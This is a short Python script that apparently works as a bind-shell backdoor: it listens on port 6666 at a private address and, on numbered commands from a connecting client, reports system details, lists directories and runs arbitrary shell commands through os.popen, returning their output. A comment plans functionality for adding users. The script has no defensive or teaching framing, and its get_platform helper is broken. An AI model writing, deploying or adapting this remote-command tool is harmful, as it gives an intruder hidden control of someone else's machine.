import socket as sk
import platform as pf
import os

ConnectionString = {"IPAddress": "192.168.0.49", "IPPort": 6666}

def get_platform():
	# TODO: Implement platform detection for adding users functionality
	os = pf.platform()
	if platform == "windows":
		print(f"platform is: {os}")
	elif platform == "linux":
		print(f"platform is: {os}")
	elif platform == "osx":
		print(f"platform is: {os}")

def Main():
	IPAddress = ConnectionString.get("IPAddress")
	IPPort = ConnectionString.get("IPPort")

	with sk.socket(sk.AF_INET, sk.SOCK_STREAM) as s:
		s.setsockopt(sk.SOL_SOCKET, sk.SO_REUSEADDR, 1)
		s.bind((IPAddress, IPPort))
		s.listen()
		connection, address = s.accept()
		while 1:
			try:
				data = connection.recv(1024)
			except:continue
			if(data.decode('utf-8') == '1'):
				OS = pf.platform()
				Machine = pf.machine()
				Proc = pf.processor()
				uname = pf.uname()
				connection.send(f'OS: \t\t{OS}\r\nMachine: \t{Machine}\r\nProcessor: \t{Proc}\r\nNode: \t\t{uname[1]}'.encode())
			elif(data.decode('utf-8') == '2'):
				data = connection.recv(1024)
				try:
					filelist = os.listdir(data.decode('utf-8'))
					tosend = ""
					for x in filelist:
						tosend += "," + x
				except:
					tosend = f"Wrong Path: {data.decode('utf-8')}"
				connection.send(tosend.encode())
			elif(data.decode('utf-8') == '3'):
				data = connection.recv(1024)
				try:
					CommandOutput = os.popen(data.decode('utf-8'))
					tosend = str(CommandOutput.read())
				except:
					tosend = f"Command: {data.decode('utf-8')} did not complete"
				connection.send(tosend.encode())
			elif(data.decode('utf-8') == '4'):
				data = connection.recv(1024)
				prompt = 'Functionality not yet implemented'
				connection.send(prompt.encode())
			elif(data.decode('utf-8') == '0'):
				connection.close()
				break

Main()